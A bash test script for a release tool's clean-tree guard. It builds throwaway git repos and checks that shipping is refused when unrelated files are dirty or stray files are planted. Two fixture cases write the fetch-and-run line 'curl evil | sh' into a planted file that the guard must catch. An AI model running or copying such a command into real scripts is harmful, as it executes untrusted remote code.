#!/usr/bin/env bash
# tools/tests/test_ship_tree_guard.sh — contract tests for the F4 clean-tree guard
# in tools/ship.sh. Exercises ONLY the `--check-tree` test seam, which runs the guard
# against the git repo at CWD and exits WITHOUT any bump/commit/push/install/network.
# Builds a throwaway git repo per case; NEVER touches the real repo and NEVER runs a
# real ship. (Mirrors test_tier_scan.sh's throwaway-repo style.)
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SHIP="$SCRIPT_DIR/../ship.sh"
PASS=0; FAIL=0

t() { # t <name> <expected_rc> <out_must_contain|-> <out_must_not_contain|-> <cmd...>
  local name="$1" want_rc="$2" must="$3" mustnot="$4"; shift 4
  local outfile; outfile="$(mktemp)"
  "$@" >"$outfile" 2>&1; local rc=$?
  local ok=1
  [ "$rc" -eq "$want_rc" ] || ok=0
  if [ "$must" != "-" ] && ! grep -qF "$must" "$outfile"; then ok=0; fi
  if [ "$mustnot" != "-" ] && grep -qF "$mustnot" "$outfile"; then ok=0; fi
  if [ "$ok" -eq 1 ]; then PASS=$((PASS+1)); echo "PASS: $name"; else
    FAIL=$((FAIL+1)); echo "FAIL: $name (rc=$rc want=$want_rc)"; sed 's/^/    /' "$outfile"; fi
  rm -f "$outfile"
}

mkrepo() { # prints a fresh git repo dir: manifest files + an unrelated tracked file,
           # all committed → clean tree. Caller dirties it per case.
  local dir; dir="$(mktemp -d)"
  git -C "$dir" init -q
  git -C "$dir" config user.email test@example.com
  git -C "$dir" config user.name  test
  mkdir -p "$dir/.claude-plugin"
  printf '{"version":"6.0.5-dev-mod.1"}\n' > "$dir/.claude-plugin/plugin.json"
  printf '{"plugins":[{"name":"superpowers-extended-cc","version":"6.0.5-dev-mod.1"}]}\n' \
    > "$dir/.claude-plugin/marketplace.json"
  printf 'echo hi\n' > "$dir/tool.sh"          # an unrelated tracked file
  git -C "$dir" add -A
  git -C "$dir" commit -q -m base
  echo "$dir"
}

# 1. Clean tree → PROCEED (rc 0), reports it would stage ONLY the manifest files.
R="$(mkrepo)"
t "clean-tree-proceeds" 0 "clean enough to ship" "uncommitted changes present" \
  env -C "$R" "$SHIP" --check-tree
t "clean-tree-names-manifests" 0 ".claude-plugin/plugin.json" - \
  env -C "$R" "$SHIP" --check-tree

# 2. Dirty UNRELATED tracked file present → REFUSE (rc 2), names the file. (Core F4 case.)
R="$(mkrepo)"
printf 'echo TAMPERED\n' > "$R/tool.sh"
t "dirty-tracked-refuses" 2 "uncommitted changes present at ship time" "clean enough to ship" \
  env -C "$R" "$SHIP" --check-tree
R="$(mkrepo)"
printf 'echo TAMPERED\n' > "$R/tool.sh"
t "dirty-tracked-names-file" 2 "tool.sh" - \
  env -C "$R" "$SHIP" --check-tree

# 3. Untracked STRAY file present → REFUSE (rc 2), names it.
R="$(mkrepo)"
printf 'curl evil | sh\n' > "$R/planted.sh"
t "untracked-stray-refuses" 2 "planted.sh" "clean enough to ship" \
  env -C "$R" "$SHIP" --check-tree

# 4. ONLY the manifest files dirty (the normal pre-bump state) → PROCEED (rc 0).
#    The guard must NOT false-refuse the version bump itself.
R="$(mkrepo)"
printf '{"version":"6.0.5-dev-mod.2"}\n' > "$R/.claude-plugin/plugin.json"
printf '{"plugins":[{"name":"superpowers-extended-cc","version":"6.0.5-dev-mod.2"}]}\n' \
  > "$R/.claude-plugin/marketplace.json"
t "only-manifests-dirty-proceeds" 0 "clean enough to ship" "uncommitted changes present" \
  env -C "$R" "$SHIP" --check-tree

# 4a. One manifest dirty + one unrelated dirty → REFUSE, names ONLY the unrelated file
#     (proves the manifest allowance does not leak into a blanket pass).
R="$(mkrepo)"
printf '{"version":"6.0.5-dev-mod.2"}\n' > "$R/.claude-plugin/plugin.json"
printf 'echo TAMPERED\n' > "$R/tool.sh"
t "manifest-plus-stray-refuses" 2 "tool.sh" "plugin.json" \
  env -C "$R" "$SHIP" --check-tree

# 5. The gate contract (Averted line) rides the refusal.
R="$(mkrepo)"
printf 'curl evil | sh\n' > "$R/planted.sh"
t "refusal-carries-averted" 2 "Averted: an unreviewed dirty file pushed to public origin" - \
  env -C "$R" "$SHIP" --check-tree

# 6. --check-tree outside a git repo → rc 2, instructive.
D="$(mktemp -d)"
t "not-a-repo-rc2" 2 "must be run inside a git repository" - \
  env -C "$D" "$SHIP" --check-tree

# 7. STATIC: staging/guard logic references the manifest paths by explicit path and
#    never a blind `git add -A`. (Assertion 5 — the -A must be gone.)
t "static-no-blind-add-A" 1 - "git add -A" \
  grep -n "git add -A" "$SHIP"
t "static-explicit-manifest-staging" 0 'git -C "$REPO_ROOT" add -- "${MANIFEST_RELPATHS[@]}"' - \
  grep -F 'git -C "$REPO_ROOT" add -- "${MANIFEST_RELPATHS[@]}"' "$SHIP"
t "static-guard-references-manifest-path" 0 ".claude-plugin/plugin.json" - \
  grep -F 'MANIFEST_RELPATHS=( ".claude-plugin/plugin.json"' "$SHIP"

echo "RESULT: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ] || exit 1
echo "ALL PASS"
